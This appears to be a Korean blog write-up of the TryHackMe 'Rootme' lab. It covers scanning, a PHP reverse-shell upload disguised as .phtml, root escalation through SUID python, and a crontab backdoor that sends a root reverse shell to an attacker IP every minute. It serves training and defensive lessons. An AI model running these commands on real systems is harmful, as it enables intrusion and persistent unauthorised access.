---
layout: post
title: "2. Rootme"
date: 2026-03-20
---

## 프로젝트 개요
본 프로젝트는 **TryHackMe**의 'Rootme' 머신을 대상으로 진행한 모의해킹 실무 프로세스 학습 과정입니다. 웹 취약점을 통한 파일 업로드 공격부터 시스템의 SUID 설정을 이용한 권한 상승까지, 리눅스 기반 시스템 침투의 핵심 기법들을 체계적으로 실습하였습니다.

---

## 키워드(keyword)
`nmap`, `gobuster`, `PHP Reverse Shell`, `SUID`, `python`

## 1. 정보 수집 (Information Gathering)
대상 시스템에서 활성화된 서비스와 포트를 식별하기 위해 `nmap` 스캐닝을 수행했습니다.

* **수행 내용:** 모든 포트 및 서비스 버전 스캔 (`-sC`, `-sV`)
* **결과:** 22번(SSH)과 80번(HTTP) 포트가 열려 있으며, **Apache 2.4.41** 서버가 구동 중임을 확인했습니다.

```bash
nmap -sC -sV 10.67.172.186
```

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/1. 정보수집(nmap).png" alt="Nmap Scan Result" />
</div>

---

## 2. 서비스 분석 (Service Analysis)
웹 서버의 숨겨진 디렉토리를 찾아내기 위해 `gobuster`를 활용하여 디렉토리 브루트포싱을 진행했습니다.

* **수행 내용:** 공통 단어장(`common.txt`)을 이용한 디렉토리 리스팅
```bash
gobuster dir -u http://10.67.172.186 -w /usr/share/wordlists/dirb/common.txt
```
* **결과:** `/panel/`(파일 업로드 페이지)과 `/uploads/`(업로드된 파일 저장소)라는 핵심 경로를 발견했습니다.

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/2. 서비스분석(gobuster).png" alt="Gobuster Directory Brute Force" />
</div>

---

## 3. 침투 수행 (Exploit)
파일 업로드 취약점을 이용하여 대상 서버의 제어권을 획득하는 단계입니다.

* **리버스 쉘 준비:** 칼리 리눅스 내장 PHP 리버스 쉘 스크립트를 수정하여 준비했습니다.
```bash
cp /usr/share/webshells/php/php-reverse-shell.php .
```
* **공격 수행:** `.php` 확장자 필터링을 우회하기 위해 확장자를 `.phtml`로 변경하여 `/panel/`을 통해 업로드했습니다.
* **결과:** `/uploads/` 경로에서 실행시킨 결과, `www-data` 권한의 쉘을 획득했습니다.

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/3-1. exploit(리버스쉘).png" alt="Prepare Reverse Shell" />
</div>

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/3-2. exploit(파일업로드).png" alt="File Upload Bypass" />
</div>

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/3-3. exploit(쉘 획득).png" alt="Shell Gained via Netcat" />
</div>

---

## 4. 권한 상승 (Post-Exploit)
획득한 일반 권한을 시스템 최고 권한인 `root`로 상승시키기 위한 분석을 진행했습니다.

* **SUID 설정 분석:** `find` 명령어를 통해 실행 시 소유자 권한으로 실행되는(SUID) 파일을 검색했습니다.
```bash
  find / -perm -4000 -print 2>/dev/null
```
* **취약점 발견:** 특이하게 `/usr/bin/python`에 SUID 비트가 설정되어 있는 것을 식별했습니다.
* **결과:** Python의 `os.execl` 라이브러리를 이용하여 root 권한의 bash 쉘을 획득하는 데 성공했습니다.
```bash
python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/4-1. post-exploit(SUID확인).png" alt="Searching SUID Files" />
</div>

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/4-2. post-exploit(python 이용).png" alt="Privilege Escalation via Python" />
</div>

---

## 5. 지속성 유지 및 흔적 분석 (Persistence & Analysis)
공격 효율성을 높이기 위한 백도어 설정과 타 공격자의 흔적을 조사했습니다.

* **지속성 유지:** `crontab`에 매 분마다 공격자 PC로 리버스 쉘을 전송하는 명령어를 등록하여 접근 권한을 고착화했습니다.
```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/192.168.216.48/9999 0>&1'" >> /etc/crontab
```
* **흔적 발견:** 조사 과정 중 `/uploads/` 디렉토리에서 다른 사용자가 업로드한 것으로 추정되는 `shell.php5` 및 이미지 파일들을 발견하여, 해당 서버가 이미 다수의 공격 대상이 되었음을 확인했습니다.

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/5-1. 백도어(crontab).png" alt="Setting Crontab Backdoor" />
</div>

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/5-2. 백도어(성공).png" alt="Persistence Success" />
</div>

<div style="text-align: center;">
  <img src="/사진들/Hacking/Rootme/다른사람_침투_흔적.png" alt="Evidence of Other Attackers" />
</div>

---

## 마치며
이번 Rootme 실습을 통해 웹 애플리케이션의 **파일 확장자 검증 우회** 기법과 리눅스 **SUID 권한 설정 오류**가 시스템 전체 보안에 얼마나 치명적인 영향을 미치는지 체감할 수 있었습니다. 특히 실제 운영 환경과 유사하게 다른 침투 흔적을 발견하면서, 사후 대응 및 보안 패치의 중요성을 다시 한번 상기하게 되었습니다.
